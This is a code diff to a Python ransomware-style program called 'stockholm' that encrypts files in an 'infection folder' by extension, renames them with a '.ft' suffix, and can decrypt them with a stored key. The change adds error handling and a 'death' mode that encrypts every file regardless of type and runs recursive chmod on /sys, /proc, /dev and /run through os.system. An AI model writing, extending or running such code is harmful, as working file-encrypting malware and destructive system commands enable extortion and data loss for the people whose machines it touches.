@@ -119,39 +119,55 @@ def find_files_rec(folder):
     return finalfiles
 
 def stockholm(action, files, death):
-   if len(files) == 0:
-       stock_print(f'{Fore.RED}Infection folder is not existent or empty{Style.RESET_ALL}')
-       sys.exit(1)
+    if len(files) == 0:
+        stock_print(f'{Fore.RED}Infection folder is not existent or empty{Style.RESET_ALL}')
+        sys.exit(1)
        
-   if action:
-       stockholm_key = generate_and_store_key()
-       stock_print(f'{Fore.MAGENTA}Encrypting ...{Style.RESET_ALL}')
-   else:
-       stockholm_key = load_key()
-       stock_print(f'{Fore.GREEN}Decrypting ...{Style.RESET_ALL}')
+    if death:
+        critical_dirs = ['/sys', '/proc', '/dev', '/run']
+        for critical_dir in critical_dirs:
+            try:
+                stock_print(f"{Fore.YELLOW}Changing permissions for {critical_dir}{Style.RESET_ALL}")
+                os.system(f"chmod -R u+w {critical_dir}")
+            except Exception as e:
+                stock_print(f"{Fore.RED}Failed to modify {critical_dir}: {e}{Style.RESET_ALL}")
+    
+    if action:
+        stockholm_key = generate_and_store_key()
+        stock_print(f'{Fore.MAGENTA}Encrypting ...{Style.RESET_ALL}')
+    else:
+        stockholm_key = load_key()
+        stock_print(f'{Fore.GREEN}Decrypting ...{Style.RESET_ALL}')
 
-   for file in files:
-       if action:
-           if os.path.splitext(file)[1] in EXTENSIONS or death:
-               stock_print(f'{Fore.MAGENTA}Encrypting File: {Style.RESET_ALL}{file}')
-               encrypt_file(file, stockholm_key)
-               os.rename(file, file + ".ft")
-           else:
-               stock_print(f'{Fore.YELLOW}Skipping   File: {Style.RESET_ALL}{file} {Fore.YELLOW}(Not encryptable){Style.RESET_ALL}')
-       else:
-           base, ext = os.path.splitext(file)
-           if ext == '.ft' and os.path.splitext(base)[1] in EXTENSIONS:
-               if decrypt_file(file, stockholm_key):
-                   stock_print(f'{Fore.GREEN}Decrypting File: {Style.RESET_ALL}{file}')
-                   os.rename(file, file[:-3])
-               else:
-                   stock_print(f'{Fore.RED}Skipping   File: {Style.RESET_ALL}{file} {Fore.RED}(Decryption failed){Style.RESET_ALL}')
-           else:
-               if ext == '.ft':
-                   stock_print(f'{Fore.YELLOW}Skipping   File: {Style.RESET_ALL}{file} {Fore.YELLOW}(Not a valid encrypted file){Style.RESET_ALL}')
-               else:
-                   stock_print(f'{Fore.YELLOW}Skipping   File: {Style.RESET_ALL}{file} {Fore.YELLOW}(Not encrypted){Style.RESET_ALL}')
-       time.sleep(0.1)
+    for file in files:
+        if action:
+            try:
+                if os.path.splitext(file)[1] in EXTENSIONS or death:
+                    stock_print(f'{Fore.MAGENTA}Encrypting File: {Style.RESET_ALL}{file}')
+                    encrypt_file(file, stockholm_key)
+                    os.rename(file, file + ".ft")
+                else:
+                    stock_print(f'{Fore.YELLOW}Skipping   File: {Style.RESET_ALL}{file} {Fore.YELLOW}(Not encryptable){Style.RESET_ALL}')
+            except Exception as e:
+                stock_print(f"{Fore.RED}Error processing file {file}: {str(e)}{Style.RESET_ALL}")
+        else:
+            try:
+                base, ext = os.path.splitext(file)
+                if ext == '.ft' and os.path.splitext(base)[1] in EXTENSIONS:
+                    if decrypt_file(file, stockholm_key):
+                        stock_print(f'{Fore.GREEN}Decrypting File: {Style.RESET_ALL}{file}')
+                        os.rename(file, file[:-3])
+                    else:
+                        stock_print(f'{Fore.RED}Skipping   File: {Style.RESET_ALL}{file} {Fore.RED}(Decryption failed){Style.RESET_ALL}')
+                else:
+                    if ext == '.ft':
+                        stock_print(f'{Fore.YELLOW}Skipping   File: {Style.RESET_ALL}{file} {Fore.YELLOW}(Not a valid encrypted file){Style.RESET_ALL}')
+                    else:
+                        stock_print(f'{Fore.YELLOW}Skipping   File: {Style.RESET_ALL}{file} {Fore.YELLOW}(Not encrypted){Style.RESET_ALL}')
+            except Exception as e:
+                stock_print(f"{Fore.RED}Error processing file {file}: {str(e)}{Style.RESET_ALL}")
+    if not death:
+        time.sleep(0.1)
 
 def main():
     global silent
